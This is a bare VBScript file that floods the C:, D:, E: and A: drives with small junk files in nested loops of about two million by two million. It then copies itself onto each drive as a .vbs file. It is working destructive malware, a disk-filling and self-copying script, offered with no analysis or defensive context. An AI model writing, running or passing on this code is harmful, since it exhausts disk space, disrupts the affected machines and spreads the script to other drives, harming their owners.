On Error Resume Next
Set SCR = Wscript.CreateObject("Scripting.FileSystemObject")
ScrYo = "C:\SCR"
ScrSave
ScrYo = "D:\SDR"
ScrSave
ScrYo = "E:\SER"
ScrSave
ScrYo = "A:\SAR"
ScrSave

function ScrSave()
ScrN1 = 2000666
For ScrO = 1 to ScrN1
  ScrN2 = 2000666
  For ScrI = 1 to ScrN2
    Set ScrW = Scr.CreateTextFile(ScrYo & ScrO & "-" & ScrI & ".s.c.r", True)
    ScrW.Write "S.C.R."
    ScrW.Close
  Next
Next
Scr.CopyFile Wscript.ScriptFullName, ScrYo & ".vbs", True
End Function
